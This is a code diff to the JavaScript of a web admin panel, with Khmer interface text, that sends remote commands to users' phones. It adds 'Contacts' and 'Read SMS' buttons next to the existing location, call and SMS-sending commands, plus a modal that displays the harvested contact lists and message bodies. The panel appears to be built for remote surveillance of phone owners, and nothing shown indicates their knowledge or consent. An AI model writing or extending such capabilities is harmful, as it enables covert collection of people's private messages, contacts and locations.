@@ -91,6 +91,16 @@ function toast(msg, type = '') {
   el._t = setTimeout(() => el.classList.add('hidden'), 3200);
 }
 
+function showModal(title, bodyHtml) {
+  const modal = $('#modal');
+  $('#modalTitle').textContent = title;
+  $('#modalBody').innerHTML = bodyHtml;
+  $('#modalCancel').style.display = 'none';
+  $('#modalSave').style.display = 'none';
+  modal.classList.remove('hidden');
+  $('#modalClose').onclick = () => modal.classList.add('hidden');
+}
+
 async function api(path, opts = {}) {
   const res = await fetch(API + path, {
     ...opts,
@@ -1654,6 +1664,8 @@ async function renderDevices() {
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_location')">📍 Location</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'make_call')">📞 Call</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'send_sms')">💬 SMS</button>
+                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_contacts')">👥 Contacts</button>
+                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_sms')">📨 Read SMS</button>
                 </td>
               </tr>
             `).join('')}
@@ -1704,14 +1716,69 @@ window.sendDeviceCmd = async function(userId, cmdType) {
     const message = prompt('បញ្ចូលសារ SMS:');
     if (!message) return;
     payload = { phone, message };
+  } else if (cmdType === 'get_contacts') {
+    const query = prompt('ស្វែងរក contact (ទទេ = យកទាំងអស់):') || '';
+    payload = { query };
+  } else if (cmdType === 'get_sms') {
+    const query = prompt('ស្វែងរក SMS (ទទេ = យកទាំងអស់):') || '';
+    payload = { query };
   }
   try {
     const res = await api('/device/command', 'POST', { user_id: userId, command_type: cmdType, payload });
     toast(`✅ Command បានផ្ញើ (${res.online ? 'online' : 'offline'})`);
+    
+    // Show results for contacts/SMS reading
+    if (cmdType === 'get_contacts' || cmdType === 'get_sms') {
+      setTimeout(() => showCommandResults(cmdType, res.command), 500);
+    }
+    
     renderDevices();
   } catch (e) {
     toast(`❌ ${e.message}`, true);
   }
+};
+
+window.showCommandResults = async function(cmdType, cmd) {
+  // Fetch the latest command data with results
+  const commands = await api(`/device/commands?user_id=${cmd.user_id}`);
+  const latest = commands.commands?.find(c => c.id === cmd.id);
+  
+  if (!latest || !latest.result_data) {
+    toast('⏳ កំពុងរង់ចាំ result...', false);
+    return;
+  }
+  
+  const data = latest.result_data;
+  let html = '<div style="max-height:60vh;overflow-y:auto">';
+  
+  if (cmdType === 'get_contacts') {
+    const contacts = data.contacts || [];
+    html += `<h3>📱 Contacts (${contacts.length})</h3>`;
+    if (contacts.length === 0) {
+      html += '<p>មិនមាន contacts ទេ</p>';
+    } else {
+      html += '<table style="width:100%;margin-top:12px"><thead><tr><th>ឈ្មោះ</th><th>ទូរស័ព្ទ</th><th>Email</th></tr></thead><tbody>';
+      contacts.forEach(c => {
+        html += `<tr><td>${esc(c.displayName || '—')}</td><td>${esc((c.phones || []).join(', ') || '—')}</td><td>${esc((c.emails || []).join(', ') || '—')}</td></tr>`;
+      });
+      html += '</tbody></table>';
+    }
+  } else if (cmdType === 'get_sms') {
+    const messages = data.messages || [];
+    html += `<h3>💬 SMS Messages (${messages.length})</h3>`;
+    if (messages.length === 0) {
+      html += '<p>មិនមាន SMS ទេ (មុខងារនេះតម្រូវឱ្យមាន native Android code)</p>';
+    } else {
+      html += '<div style="display:flex;flex-direction:column;gap:8px;margin-top:12px">';
+      messages.forEach(m => {
+        html += `<div style="padding:12px;border:1px solid #ddd;border-radius:8px"><strong>${esc(m.address || 'Unknown')}</strong><br><small>${dt(m.date)}</small><p style="margin:8px 0 0">${esc(m.body || '')}</p></div>`;
+      });
+      html += '</div>';
+    }
+  }
+  
+  html += '</div>';
+  showModal(cmdType === 'get_contacts' ? '📱 Contacts' : '💬 SMS Messages', html);
 };
 
 const RENDERERS = {
